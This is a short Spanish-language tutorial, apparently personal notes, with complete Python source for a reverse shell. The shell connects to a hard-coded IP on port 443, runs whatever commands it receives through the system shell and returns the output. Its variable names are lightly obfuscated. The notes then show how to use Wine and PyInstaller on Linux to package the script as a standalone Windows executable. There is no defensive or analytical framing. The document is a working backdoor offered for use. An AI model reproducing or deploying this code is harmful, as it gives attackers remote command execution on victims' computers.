Codigo python para crear un areverse shell que ofuscaremos

```
import socket as s
import subprocess as sp

A = "20.20.20.7"
B = 443
C = 1024

D = s.socket(s.AF_INET, s.SOCK_STREAM)
D.connect((A, B))

while True:
    try:
        E = D.recv(C)
        if not E:
            break

        F = E.decode("utf-8").strip()

        if len(F) > 1:
            try:
                G = sp.check_output(F, shell=True, stderr=sp.STDOUT)
            except sp.CalledProcessError as H:
                G = H.output
            # Aquí debería enviar G de vuelta
            D.send(G)
        # Puede que haya otro except para excepciones generales del bucle
    except Exception as I:
        D.send(f"Error: {str(I)} \n".encode('utf-8'))
        break

D.close()

                
```

Instalaremos Wine 

```
sudo dpkg --add-architecture i386
sudo apt update

# instalar paquetes recomendados de wine
sudo apt update
sudo apt install wine wine32

Nos descargamos el instalador de python de 32bit y lo instalamos con wine

Nos movemos a la carpeta donde lo descargamos

wine python-3.9.13.exe

Nos cremos una carpeta dentro de wine para poder convertir nustro codigo de python en .exe para windows
con la libreria pyinstaller que procedemos a instalar

cd ~/.wine32/drive_c/
mkdir -p Pytest/Salida

Esta sera la carpeta donde pondremos nuestro codigo y donde saldra el .exe

Instalamos pyinstaller
wine "/home/alexandross/.wine/drive_c/users/alexandross/AppData/Local/Programs/Python/Python39-32/python.exe" -m pip install pyinstaller

Creamos nustro codigo .py y lo convertimos a .exe

wine "/home/alexandross/.wine/drive_c/users/alexandross/AppData/Local/Programs/Python/Python39-32/python.exe" -m PyInstaller --onefile --distpath C:\\PyTest\\Salida C:\\Pytest\\shell.py

Si nos fijamos las rutas deben ser como en windowd estas se encuenrarn dentro de la carpeta .wine
```